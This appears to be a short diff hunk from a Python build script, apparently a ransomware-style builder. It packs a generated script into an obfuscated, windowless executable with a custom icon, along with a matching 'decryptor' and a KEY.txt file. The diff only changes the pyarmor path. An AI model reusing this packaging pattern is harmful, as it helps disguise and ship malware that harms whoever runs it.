@@ -141,8 +141,8 @@ with open("lib/source_de.py", "r") as f:
 	open(fout+"/"+"decryptor_"+fname+".py", "w").write(cofig)
 
 
-os.system('/home/kali/.local/bin/pyarmor pack -e " --onefile --noconsole -i '+icon+'" '+fout+'/'+fname+'.py ')
-os.system('/home/kali/.local/bin/pyarmor pack -e " --onefile  " '+fout+'/decryptor_'+fname+'.py ')
+os.system('pyarmor pack -e " --onefile --noconsole -i '+icon+'" '+fout+'/'+fname+'.py ')
+os.system('pyarmor pack -e " --onefile  " '+fout+'/decryptor_'+fname+'.py ')
 open(fout+"/"+"KEY.txt", "w").write(key)
 exe_file = os.path.join(fout, "dist")
 
